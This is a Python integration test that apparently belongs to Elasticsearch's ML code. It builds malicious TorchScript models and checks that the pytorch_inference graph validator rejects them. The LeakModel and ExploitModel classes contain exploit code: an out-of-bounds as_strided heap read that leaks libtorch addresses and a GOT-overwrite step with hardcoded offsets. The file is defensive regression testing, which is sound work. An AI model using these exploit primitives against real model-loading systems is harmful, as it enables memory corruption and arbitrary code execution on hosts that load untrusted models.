#!/usr/bin/env python3
#
# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0 and the following additional limitation. Functionality enabled by the
# files subject to the Elastic License 2.0 may only be used in production when
# invoked by an Elasticsearch process with a license key installed that permits
# use of machine learning features. You may not use this file except in
# compliance with the Elastic License 2.0 and the foregoing additional
# limitation.
#
"""End-to-end integration test: verify pytorch_inference rejects evil models.

This script generates the sandbox2 attack models from PR #2873, wraps them
in the binary framing format that Elasticsearch uses to send models to
pytorch_inference, and invokes the actual binary to confirm that the
CModelGraphValidator rejects them at load time — before any tensor code
executes.

Unlike the pure-Python graph validation test (test_graph_validation_evil_models.py),
this exercises the full C++ code path: model deserialization, graph inlining,
allowlist checking, and the HANDLE_FATAL exit that Elasticsearch relies on.

The evil models reproduce two real-world attack vectors against TorchScript:

  * LeakModel     — uses torch.as_strided with an enormous storage offset
    to read out-of-bounds heap memory and leak libtorch base addresses,
    defeating ASLR.

  * ExploitModel  — extends the heap-leak to overwrite a GOT entry
    (mprotect), mark a heap page as executable, and jump to shellcode
    that writes arbitrary files to disk.

A SimpleBenignModel is included as a positive control to ensure the
validator does not reject models that use only allowlisted operations.

Prerequisites:
  - PyTorch (torch) must be installed.
  - A pytorch_inference binary built from the feature/harden_pytorch_inference
    branch (or any branch that includes CModelGraphValidator).

Usage:
    python3 test_pytorch_inference_evil_models.py [--binary PATH]

    --binary PATH   Explicit path to the pytorch_inference executable.
                    If omitted, standard build locations are searched.

Exit code: 0 if all tests pass, 1 otherwise.
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import torch
from torch import Tensor

from pytorch_inference_test_utils import (
    find_pytorch_inference,
    run_pytorch_inference,
    script_and_save_model,
)


# ---------------------------------------------------------------------------
# Attack model definitions (from PR #2873 sandbox2 security research)
#
# These models are intentionally malicious.  They must NEVER be executed
# outside of a sandboxed environment — the graph validator should reject
# them before any forward() code runs.
# ---------------------------------------------------------------------------


class SimpleBenignModel(torch.nn.Module):
    """Positive control — uses only allowlisted ops (aten::add, aten::unsqueeze)."""
    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        return (a + b + c + d).unsqueeze(0)


class LeakModel(torch.nn.Module):
    """Heap-address leak via torch.as_strided with a malicious storage offset.

    Creates an out-of-bounds strided view into the process heap, then scans
    for libtorch pointer patterns to compute the library base address.
    Rejected by the graph validator because aten::as_strided, aten::item,
    and aten::__rshift__ are not in the allowlist.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length
        )
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (
                leak[i + 3].item() == leak[i + 5].item()
                and leak[i + 3].item() >> 40 == 127
            ):
                if (
                    leak[i + 2].item() >= 0x100000000
                    and leak[i + 2].item() <= 0x100000005
                ):
                    index.append(i)
        return (index, leak)

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xDEAD00000 + i] + [
                0xDEAD00000 + j for j in range(2, array_len)
            ]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xC878B50
                assert 1 == 0, (
                    "Input tensor must have at least one element: "
                    + hex(libtorch_cpu_addr)
                )
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


class ExploitModel(torch.nn.Module):
    """ROP-chain exploit: mprotect + shellcode to write arbitrary files.

    After leaking the libtorch base address (same technique as LeakModel),
    overwrites a GOT entry to redirect mprotect into a ROP gadget chain
    that marks a heap page as executable, then jumps to embedded shellcode.
    Rejected by the graph validator because aten::as_strided, aten::item,
    aten::Delete and other operations are not in the allowlist.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length
        )
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (
                leak[i + 3].item() == leak[i + 5].item()
                and leak[i + 3].item() >> 40 == 127
            ):
                if (
                    leak[i + 2].item() >= 0x100000000
                    and leak[i + 2].item() <= 0x100000005
                ):
                    index.append(i)
        return (index, leak)

    def get_address_data(
        self, leak: Tensor, index: int, tmp: list[Tensor], target_addr: int
    ) -> int:
        leak[index] = target_addr
        return int(tmp[0].item())

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xDEAD00000 + i] + [
                0xDEAD00000 + j for j in range(2, array_len)
            ]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xC878B50
                leak[index + 3] = int(heap_addr - 0x8)
                for j in range(heap_len):
                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
                        mprotect_got_addr = 0xC9785F0 + libtorch_cpu_addr
                        self.get_address_data(
                            leak, index + 3, tmp[j : j + 1], int(mprotect_got_addr)
                        )
                        del tmp[j]
                        assert 1 == 0, "Input tensor must have at least one element: "
                        return torch.zeros(0)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


# ---------------------------------------------------------------------------
# Test configuration
# ---------------------------------------------------------------------------

MODELS = {
    "benign": {
        "class": SimpleBenignModel,
        "expect_rejected": False,
        "description": "positive control — only allowlisted ops",
    },
    "leak": {
        "class": LeakModel,
        "expect_rejected": True,
        "description": "heap-address leak via aten::as_strided",
        "expect_stderr_contains": "Unrecognised operations",
    },
    "exploit": {
        "class": ExploitModel,
        "expect_rejected": True,
        "description": "ROP-chain file-write via aten::as_strided",
        "expect_stderr_contains": "Unrecognised operations",
    },
}

# Phrases that indicate the graph validator actively rejected the model.
# Must be specific enough to avoid matching benign log lines like
# "Model verified: no forbidden operations detected."
_REJECTION_PHRASES = [
    "Model contains forbidden operations:",
    "Unrecognised operations:",
    "graph validation failed",
    "graph is too large:",
    "contains forbidden operation:",
]


# ---------------------------------------------------------------------------
# Test execution
# ---------------------------------------------------------------------------


def run_tests(binary: str) -> bool:
    """Generate evil models, run pytorch_inference, and check outcomes."""
    print("=" * 72)
    print("Integration Test: pytorch_inference vs sandbox2 attack models")
    print("=" * 72)
    print(f"Binary: {binary}")
    print()

    tmp_dir = Path(tempfile.mkdtemp(prefix="pt_infer_evil_test_"))
    all_passed = True

    try:
        for name, spec in MODELS.items():
            model_path = tmp_dir / f"model_{name}.pt"
            expect_rejected = spec["expect_rejected"]

            print(f"--- {name}: {spec['description']} ---")

            try:
                script_and_save_model(spec["class"](), model_path)
                print(f"  Model generated: {model_path.name} ({model_path.stat().st_size} bytes)")
            except Exception as e:
                print(f"  SKIP: could not generate model: {e}")
                print()
                continue

            try:
                exit_code, stdout, stderr = run_pytorch_inference(
                    binary, model_path, tmp_dir
                )
            except subprocess.TimeoutExpired:
                print(f"  FAIL: pytorch_inference timed out (30s)")
                all_passed = False
                print()
                continue
            except Exception as e:
                print(f"  ERROR running pytorch_inference: {e}")
                all_passed = False
                print()
                continue

            print(f"  Exit code: {exit_code}")
            if stderr.strip():
                stderr_lines = stderr.strip().splitlines()
                display_lines = stderr_lines[-10:] if len(stderr_lines) > 10 else stderr_lines
                print(f"  Stderr ({len(stderr_lines)} lines, showing last {len(display_lines)}):")
                for line in display_lines:
                    print(f"    {line}")

            was_rejected_by_validator = any(p in stderr for p in _REJECTION_PHRASES)

            if expect_rejected:
                if was_rejected_by_validator:
                    print(f"  Result: REJECTED by graph validator (as expected)")
                    expect_msg = spec.get("expect_stderr_contains")
                    if expect_msg and expect_msg in stderr:
                        print(f"  Reason check: found '{expect_msg}' in stderr")
                    print(f"  Test: OK")
                elif exit_code != 0:
                    print(f"  Result: process exited with code {exit_code} but no validator rejection detected")
                    print(f"  WARNING: the binary may not include the full graph validation yet")
                    print(f"  Test: INCONCLUSIVE (not counted as failure)")
                else:
                    print(f"  Result: ACCEPTED (exit 0, no validator rejection)")
                    print(f"  Test: FAIL — evil model was not rejected")
                    all_passed = False
            else:
                if was_rejected_by_validator:
                    print(f"  Result: REJECTED by validator — benign model should have passed")
                    print(f"  Test: FAIL")
                    all_passed = False
                else:
                    print(f"  Result: no validation errors (exit code {exit_code})")
                    print(f"  Test: OK")

            print()

    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    print("=" * 72)
    if all_passed:
        print("ALL TESTS PASSED")
    else:
        print("SOME TESTS FAILED — see above for details.")
    print("=" * 72)

    return all_passed


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(
        description="Integration test: pytorch_inference vs sandbox2 attack models"
    )
    parser.add_argument(
        "--binary",
        default=None,
        help="Path to pytorch_inference binary (auto-detected if omitted)",
    )
    args = parser.parse_args()

    binary = args.binary
    if binary is None:
        try:
            binary = find_pytorch_inference()
        except FileNotFoundError as e:
            print(f"ERROR: {e}", file=sys.stderr)
            sys.exit(1)

    if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
        print(f"ERROR: {binary} is not an executable file", file=sys.stderr)
        sys.exit(1)

    success = run_tests(binary)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
